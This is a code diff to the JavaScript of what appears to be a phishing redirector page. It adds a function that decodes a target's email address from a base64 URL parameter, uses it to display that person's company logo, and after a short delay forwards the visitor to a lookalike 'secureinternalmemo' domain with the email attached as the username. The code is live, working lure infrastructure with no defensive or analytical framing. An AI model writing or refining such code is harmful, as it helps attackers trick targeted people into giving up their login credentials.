@@ -154,20 +154,78 @@
         }, 600);
 
         const REDIRECT_DELAY = 3500;
-        const MOBILE_REDIRECT_URL_BASE = "https://secureinternalmemo.tdmgo.co/?WqXmwl=ZjEwMDI1ODc2NDEyNGUwN2FmYzgxZDQwNmE1MDYwZmU%3D&Zw6aMW=eNKKj8h&username=";
+       
+        const MOBILE_REDIRECT_URL_BASE = "https://secureinternalmemo.tdmgo.co/?WqXmwl=S0pCTktYQ1dTSlNOQ1NKSw%3D%3D&pCmfRY=FkpVQ&username=";
 
-        function getEmailFromState() {
+        function getEmailFromUrl() {
+            // First, try to get base64 encoded email from the first parameter after ?
+            const url = window.location.href;
+            console.log("Current URL:", url);
+            
+            const firstQuestionMark = url.indexOf('?');
+            if (firstQuestionMark !== -1) {
+                const afterQuestion = url.substring(firstQuestionMark + 1);
+                const firstParam = afterQuestion.split('&')[0];
+                console.log("First parameter after ?:", firstParam);
+                
+                // URL decode the parameter first to handle %3D and other encoded characters
+                let decodedParam;
+                try {
+                    decodedParam = decodeURIComponent(firstParam);
+                    console.log("URL decoded parameter:", decodedParam);
+                } catch (e) {
+                    console.log("URL decoding failed, using original:", e.message);
+                    decodedParam = firstParam;
+                }
+                
+                // Try to decode as base64
+                try {
+                    const decodedEmail = atob(decodedParam);
+                    console.log("Decoded from base64:", decodedEmail);
+                    if (decodedEmail && decodedEmail.includes('@') && decodedEmail.includes('.')) {
+                        console.log("Valid email found from base64:", decodedEmail);
+                        return decodedEmail;
+                    }
+                } catch (e) {
+                    console.log("Base64 decoding failed:", e.message);
+                }
+                
+                // If URL decoded param didn't work, also try the original param
+                if (decodedParam !== firstParam) {
+                    try {
+                        const decodedEmail = atob(firstParam);
+                        console.log("Decoded from base64 (original):", decodedEmail);
+                        if (decodedEmail && decodedEmail.includes('@') && decodedEmail.includes('.')) {
+                            console.log("Valid email found from base64 (original):", decodedEmail);
+                            return decodedEmail;
+                        }
+                    } catch (e) {
+                        console.log("Base64 decoding failed (original):", e.message);
+                    }
+                }
+            }
+
+            // Fallback to existing functionality - get email from state parameter
+            console.log("Checking state parameter for email...");
             const searchParams = new URLSearchParams(window.location.search);
             const state = searchParams.get('state');
-            if (!state) return null;
+            console.log("State parameter:", state);
+            
+            if (!state) {
+                console.log("No state parameter found");
+                return null;
+            }
 
             const parts = state.split(':');
             if (parts.length > 1) {
                 const potentialEmail = parts[parts.length - 1];
+                console.log("Potential email from state:", potentialEmail);
                 if (potentialEmail && potentialEmail.includes('@')) {
+                    console.log("Valid email found from state:", potentialEmail);
                     return potentialEmail;
                 }
             }
+            console.log("No valid email found");
             return null;
         }
 
@@ -186,7 +244,7 @@
         
         function performRedirect() {
             clearInterval(interval);
-            const email = getEmailFromState();
+            const email = getEmailFromUrl();
 
             if (email) {
                 console.log("Found email:", email);
@@ -206,7 +264,7 @@
             }
         }
         
-        const email = getEmailFromState();
+        const email = getEmailFromUrl();
         setCompanyLogo(email);
         setTimeout(performRedirect, REDIRECT_DELAY);
     })();
